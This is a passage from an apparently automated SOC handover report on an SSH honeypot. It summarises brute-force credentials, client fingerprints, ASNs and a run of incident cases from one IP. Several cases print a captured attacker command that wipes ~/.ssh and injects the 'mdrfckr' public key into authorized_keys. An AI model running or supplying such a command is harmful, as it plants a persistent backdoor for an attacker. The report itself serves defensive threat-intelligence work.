# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-25 |
| **Generated At** | 2026-04-25T08:58:55Z |
| **Shift Time** | 08:58 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **52** |
| Confirmed Threats | **50** |
| False Positives Filtered | **2** (3.9%) |
| Unique Attacker IPs | **5** |
| Countries of Origin | **2** |
| High Severity Cases | **18** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **34** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **52** |
| Unique Credential Pairs | **33** |
| Unique Usernames | **22** |
| Unique Passwords | **30** |
| Successful Auth Pairs | **10** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 18 |
| `345gs5662d34` | 9 |
| `GET / HTTP/1.1` | 2 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | 2 |
| `Accept-Encoding: gzip` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 9 |
| `3245gs5662d34` | 9 |
| `123456` | 4 |
| `Host: 13.235.92.17:23` | 2 |
| `Accept: */*` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 9 |
| `root` | `3245gs5662d34` | 9 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 2 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | `Accept: */*` | 2 |
| `Accept-Encoding: gzip` | `` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `1234..` | `165.154.6.102` | 2026-04-25T08:24:25 |
| `root` | `3245gs5662d34` | `165.154.6.102` | 2026-04-25T08:24:28 |
| `root` | `Aa147258...` | `165.154.6.102` | 2026-04-25T08:25:19 |
| `root` | `qq111111` | `165.154.6.102` | 2026-04-25T08:27:06 |
| `root` | `MoeClub.org` | `165.154.6.102` | 2026-04-25T08:28:03 |
| `root` | `147258369` | `165.154.6.102` | 2026-04-25T08:29:00 |
| `root` | `Ww123456@` | `165.154.6.102` | 2026-04-25T08:30:50 |
| `root` | `2glehe5t24th1issZs` | `165.154.6.102` | 2026-04-25T08:37:21 |
| `root` | `qwer123123` | `165.154.6.102` | 2026-04-25T08:41:00 |
| `root` | `munna` | `165.154.6.102` | 2026-04-25T08:42:49 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **52** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 46 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 45 | 1 |
| `03a80b21afa8...` | Modern SSH client | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 45 | 1 | libssh-based |
| `03a80b21afa8...` | libssh | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 9 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `165.154.6.102`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **5** |
| Unique ASNs | **4** |
| High-Risk ASNs | **3** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS63949` | Akamai Connected Cloud | 1 | LOW |
| `AS16509` | Amazon.com, Inc. | 1 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (18)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-eb81695d3a6a

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]102` |
| **First Seen** | 2026-04-25 08:24 |
| **Last Seen** | 2026-04-25 08:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 08:24:24` | `cowrie.session.connect` |
| `2026-04-25 08:24:24` | `cowrie.client.version` |
| `2026-04-25 08:24:24` | `cowrie.client.kex` |
| `2026-04-25 08:24:25` | `cowrie.login.success` |
| `2026-04-25 08:24:25` | `cowrie.session.params` |
| `2026-04-25 08:24:25` | `cowrie.command.input` |
| `2026-04-25 08:24:25` | `cowrie.command.failed` |
| `2026-04-25 08:24:25` | `cowrie.log.closed` |
| `2026-04-25 08:24:25` | `cowrie.session.params` |
| `2026-04-25 08:24:25` | `cowrie.command.input` |
| `2026-04-25 08:24:25` | `cowrie.session.file_download` |
| `2026-04-25 08:24:25` | `cowrie.log.closed` |
| `2026-04-25 08:24:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]102` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3562e7b11048

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]102` |
| **First Seen** | 2026-04-25 08:24 |
| **Last Seen** | 2026-04-25 08:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 08:24:27` | `cowrie.session.connect` |
| `2026-04-25 08:24:27` | `cowrie.client.version` |
| `2026-04-25 08:24:27` | `cowrie.client.kex` |
| `2026-04-25 08:24:28` | `cowrie.login.success` |
| `2026-04-25 08:24:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]102` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53cd2aceb241

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]102` |
| **First Seen** | 2026-04-25 08:25 |
| **Last Seen** | 2026-04-25 08:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 08:25:18` | `cowrie.session.connect` |
| `2026-04-25 08:25:18` | `cowrie.client.version` |
| `2026-04-25 08:25:18` | `cowrie.client.kex` |
| `2026-04-25 08:25:19` | `cowrie.login.success` |
| `2026-04-25 08:25:19` | `cowrie.session.params` |
| `2026-04-25 08:25:19` | `cowrie.command.input` |
| `2026-04-25 08:25:19` | `cowrie.command.failed` |
| `2026-04-25 08:25:19` | `cowrie.log.closed` |
| `2026-04-25 08:25:19` | `cowrie.session.params` |
| `2026-04-25 08:25:19` | `cowrie.command.input` |
| `2026-04-25 08:25:19` | `cowrie.session.file_download` |
| `2026-04-25 08:25:19` | `cowrie.log.closed` |
| `2026-04-25 08:25:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]102` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-442d1828f24e

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]102` |
| **First Seen** | 2026-04-25 08:25 |
| **Last Seen** | 2026-04-25 08:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 08:25:21` | `cowrie.session.connect` |
| `2026-04-25 08:25:21` | `cowrie.client.version` |
| `2026-04-25 08:25:21` | `cowrie.client.kex` |
| `2026-04-25 08:25:22` | `cowrie.login.success` |
| `2026-04-25 08:25:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]102` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b92e7f1b2c5d

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]102` |
| **First Seen** | 2026-04-25 08:27 |
| **Last Seen** | 2026-04-25 08:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 08:27:06` | `cowrie.session.connect` |
| `2026-04-25 08:27:06` | `cowrie.client.version` |
| `2026-04-25 08:27:06` | `cowrie.client.kex` |
| `2026-04-25 08:27:06` | `cowrie.login.success` |
| `2026-04-25 08:27:06` | `cowrie.session.params` |
| `2026-04-25 08:27:06` | `cowrie.command.input` |
| `2026-04-25 08:27:06` | `cowrie.command.failed` |
| `2026-04-25 08:27:06` | `cowrie.log.closed` |
| `2026-04-25 08:27:07` | `cowrie.session.params` |
| `2026-04-25 08:27:07` | `cowrie.command.input` |
| `2026-04-25 08:27:08` | `cowrie.session.file_download` |
| `2026-04-25 08:27:08` | `cowrie.log.closed` |
| `2026-04-25 08:27:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]102` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8a22e96c65a

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]102` |
| **First Seen** | 2026-04-25 08:27 |
| **Last Seen** | 2026-04-25 08:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 08:27:10` | `cowrie.session.connect` |
| `2026-04-25 08:27:10` | `cowrie.client.version` |
| `2026-04-25 08:27:11` | `cowrie.client.kex` |
| `2026-04-25 08:27:11` | `cowrie.login.success` |
| `2026-04-25 08:27:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]102` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea3993f51daf

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]102` |
| **First Seen** | 2026-04-25 08:28 |
| **Last Seen** | 2026-04-25 08:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 08:28:03` | `cowrie.session.connect` |
| `2026-04-25 08:28:03` | `cowrie.client.version` |
| `2026-04-25 08:28:03` | `cowrie.client.kex` |
| `2026-04-25 08:28:03` | `cowrie.login.success` |
| `2026-04-25 08:28:04` | `cowrie.session.params` |
| `2026-04-25 08:28:04` | `cowrie.command.input` |
| `2026-04-25 08:28:04` | `cowrie.command.failed` |
| `2026-04-25 08:28:04` | `cowrie.log.closed` |
| `2026-04-25 08:28:04` | `cowrie.session.params` |
| `2026-04-25 08:28:04` | `cowrie.command.input` |
| `2026-04-25 08:28:04` | `cowrie.session.file_download` |
| `2026-04-25 08:28:04` | `cowrie.log.closed` |
| `2026-04-25 08:28:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]102` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a66732919ba9

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]102` |
| **First Seen** | 2026-04-25 08:28 |
| **Last Seen** | 2026-04-25 08:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 08:28:06` | `cowrie.session.connect` |
| `2026-04-25 08:28:06` | `cowrie.client.version` |
| `2026-04-25 08:28:06` | `cowrie.client.kex` |
| `2026-04-25 08:28:06` | `cowrie.login.success` |
| `2026-04-25 08:28:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]102` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04237637d6fd

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]102` |
| **First Seen** | 2026-04-25 08:28 |
| **Last Seen** | 2026-04-25 08:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 08:28:59` | `cowrie.session.connect` |
| `2026-04-25 08:28:59` | `cowrie.client.version` |
| `2026-04-25 08:28:59` | `cowrie.client.kex` |
| `2026-04-25 08:29:00` | `cowrie.login.success` |
| `2026-04-25 08:29:00` | `cowrie.session.params` |
| `2026-04-25 08:29:00` | `cowrie.command.input` |
| `2026-04-25 08:29:00` | `cowrie.command.failed` |
| `2026-04-25 08:29:00` | `cowrie.log.closed` |
| `2026-04-25 08:29:00` | `cowrie.session.params` |
| `2026-04-25 08:29:00` | `cowrie.command.input` |
| `2026-04-25 08:29:00` | `cowrie.session.file_download` |
| `2026-04-25 08:29:00` | `cowrie.log.closed` |
| `2026-04-25 08:29:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]102` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1fd7f16cd4b

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]102` |
| **First Seen** | 2026-04-25 08:29 |
| **Last Seen** | 2026-04-25 08:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 08:29:02` | `cowrie.session.connect` |
| `2026-04-25 08:29:02` | `cowrie.client.version` |
| `2026-04-25 08:29:02` | `cowrie.client.kex` |
| `2026-04-25 08:29:03` | `cowrie.login.success` |
| `2026-04-25 08:29:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]102` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23a14db25b61

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]102` |
| **First Seen** | 2026-04-25 08:30 |
| **Last Seen** | 2026-04-25 08:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 08:30:49` | `cowrie.session.connect` |
| `2026-04-25 08:30:49` | `cowrie.client.version` |
| `2026-04-25 08:30:49` | `cowrie.client.kex` |
| `2026-04-25 08:30:50` | `cowrie.login.success` |
| `2026-04-25 08:30:50` | `cowrie.session.params` |
| `2026-04-25 08:30:50` | `cowrie.command.input` |
| `2026-04-25 08:30:50` | `cowrie.command.failed` |
| `2026-04-25 08:30:50` | `cowrie.log.closed` |
| `2026-04-25 08:30:50` | `cowrie.session.params` |
| `2026-04-25 08:30:50` | `cowrie.command.input` |
| `2026-04-25 08:30:50` | `cowrie.session.file_download` |
| `2026-04-25 08:30:50` | `cowrie.log.closed` |
| `2026-04-25 08:30:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]102` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20d3333c1caf

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]102` |
| **First Seen** | 2026-04-25 08:30 |
| **Last Seen** | 2026-04-25 08:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 08:30:52` | `cowrie.session.connect` |
| `2026-04-25 08:30:52` | `cowrie.client.version` |
| `2026-04-25 08:30:52` | `cowrie.client.kex` |
| `2026-04-25 08:30:53` | `cowrie.login.success` |
| `2026-04-25 08:30:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]102` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-735117484dda

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]102` |
| **First Seen** | 2026-04-25 08:37 |
| **Last Seen** | 2026-04-25 08:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 08:37:20` | `cowrie.session.connect` |
| `2026-04-25 08:37:20` | `cowrie.client.version` |
| `2026-04-25 08:37:20` | `cowrie.client.kex` |
| `2026-04-25 08:37:21` | `cowrie.login.success` |
| `2026-04-25 08:37:21` | `cowrie.session.params` |
| `2026-04-25 08:37:21` | `cowrie.command.input` |
| `2026-04-25 08:37:21` | `cowrie.command.failed` |
| `2026-04-25 08:37:21` | `cowrie.log.closed` |
| `2026-04-25 08:37:21` | `cowrie.session.params` |
| `2026-04-25 08:37:21` | `cowrie.command.input` |
| `2026-04-25 08:37:21` | `cowrie.session.file_download` |
| `2026-04-25 08:37:21` | `cowrie.log.closed` |
| `2026-04-25 08:37:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]102` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c198f9ff293e

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]102` |
| **First Seen** | 2026-04-25 08:37 |
| **Last Seen** | 2026-04-25 08:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

